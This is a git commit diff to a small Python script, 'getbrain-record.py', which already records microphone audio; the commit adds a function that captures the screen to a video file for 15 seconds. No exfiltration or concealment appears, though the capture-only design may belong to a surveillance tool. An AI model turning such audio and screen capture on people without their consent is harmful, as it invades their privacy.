960f50f016266d8a1324d29ebf7ce418444a66de
unknown <dazomo.fahrenheit@gmail.com>
2024-12-06 18:46:30 +0100

    1.2

--- getbrain/getbrain-record.py
+++ getbrain/getbrain-record.py
@@ -2,6 +2,9 @@ import pyaudio
 import wave
 import os
 import argparse
+import cv2
+import numpy as np
+import pyautogui
 
 bin_folder = f"C:/Users/{os.getlogin()}/bin"
 
@@ -9,7 +12,11 @@ parser = argparse.ArgumentParser(description="")
 parser.add_argument('option', type=str, help="None")
 args = parser.parse_args()
 
+screen_width, screen_height = pyautogui.size()
+resolution = (screen_width, screen_height)
+
 def record_voice(duration=15):
+    print("ok")
     format = pyaudio.paInt16
     channels = 2
     rate = 44100
@@ -30,7 +37,22 @@ def record_voice(duration=15):
         wf.setframerate(rate)
         wf.writeframes(b''.join(frames))
 
+def record_screen(duration=15):
+    print("okok")
+    fourcc = cv2.VideoWriter_fourcc(*"XVID")
+    out = cv2.VideoWriter("output.avi", fourcc, 20.0, resolution)
+    end_time = pyautogui.time.time() + duration
+    while pyautogui.time.time() < end_time:
+        img = pyautogui.screenshot()
+        frame = np.array(img)
+        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
+        out.write(frame)
+
+    # Libérer les ressources
+    out.release()
+    cv2.destroyAllWindows()
+
 if args.option == 'voice':
     record_voice()
 elif args.option == 'screen':
-    pass
+    record_screen()
